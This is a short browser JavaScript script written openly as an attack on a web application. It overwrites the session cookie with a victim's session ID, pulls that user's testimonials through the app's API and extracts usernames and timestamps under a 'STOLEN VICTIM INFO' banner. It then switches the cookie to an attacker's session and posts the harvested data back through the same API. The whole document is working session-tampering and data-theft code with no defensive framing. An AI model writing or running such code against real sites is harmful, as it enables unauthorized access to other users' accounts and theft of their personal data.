(async function postVictimUsernameTimestamp() {
    
    console.log("🚀 Fetching testimonials from session 1369...");

    // Switch to Victim Session
    document.cookie = "session=1369; path=/";
    await new Promise(r => setTimeout(r, 500));

    let testimonials = [];

    try {
        const res = await fetch('/api/testimonials', {
            method: 'GET',
            credentials: 'include'
        });

        if (res.ok) {
            testimonials = await res.json();
        }
    } catch (e) {
        console.error("Failed to fetch data", e);
    }

    // Extract only username and timestamp from all testimonials
    let extractedData = "";

    if (Array.isArray(testimonials) && testimonials.length > 0) {
        extractedData = testimonials.map((item, index) => {
            const username = item.username || item.user_name || "Unknown";
            const timestamp = item.timestamp || "No timestamp";
            return `Victim ${index + 1} → Username: ${username} | Timestamp: ${timestamp}`;
        }).join("\n");
    } else if (testimonials) {
        const item = testimonials;
        const username = item.username || item.user_name || "Unknown";
        const timestamp = item.timestamp || "No timestamp";
        extractedData = `Username: ${username} | Timestamp: ${timestamp}`;
    } else {
        extractedData = "No testimonials found";
    }

    const finalContent = `=== STOLEN VICTIM INFO (1369) ===\n\n${extractedData}\n\n=== END ===`;

    console.log("\n📋 Data to be posted to 1333:\n");
    console.log(finalContent);

    // Switch to Attacker Session
    document.cookie = "session=1333; path=/";
    await new Promise(r => setTimeout(r, 600));

    // Post to 1333
    await fetch('/api/testimonials', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': '*/*'
        },
        credentials: 'include',
        body: JSON.stringify({ 
            content: finalContent 
        })
    })
    .then(r => {
        console.log("POST Status:", r.status);
        return r.text();
    })
    .then(text => console.log("✅ Successfully posted to session 1333"))
    .catch(err => console.error("POST Error:", err));

    console.log("🎯 Done! Username & Timestamp from 1369 posted to 1333");

})();
